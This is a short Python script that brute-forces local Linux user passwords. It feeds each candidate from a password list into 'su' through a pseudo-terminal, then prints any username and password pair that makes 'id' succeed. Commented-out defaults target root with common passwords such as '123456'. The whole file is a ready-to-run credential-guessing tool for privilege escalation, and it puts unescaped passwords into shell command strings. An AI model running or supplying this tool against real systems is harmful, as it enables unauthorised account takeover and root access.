import os

def su_user(passwd,user):
    cmd = '''python -c "import time; time.sleep(0.1); print('{}')" | python -c "import pty; pty.spawn(['su','-c','id', '{}']);"'''.format(passwd,user)
    #cmd = '''sleep 0.1; echo "{}" | python -c "import pty; pty.spawn(['su','-c','id','{}']);"'''.format(passwd,user)
    #cmd = '''(sleep 0.1; echo "{}") | python -c "import pty; pty.spawn(['su','-c','id','{}']);"'''.format(passwd,user)

    f = os.popen(cmd)
    str = f.read()
    f.close()
    if "("+user in str:
        return 1
    return 0
    
def read_file_to_list(file):
    f = open(file,'r')
    content = f.readlines()
    for i in range(len(content)):
        content[i] = content[i].rstrip("\n").rstrip("\r")
    f.close()
    return content

users = read_file_to_list('user.txt')
passwds = read_file_to_list('pass.txt')

#users = ["root","test"]
#passwds = ["000000","123456","12345678"]

for user in users:
    for passwd in passwds:
        istrue = su_user(passwd,user)
        if istrue == 1:
            print("user is: "+user)
            print("password is: "+passwd)
            break
            
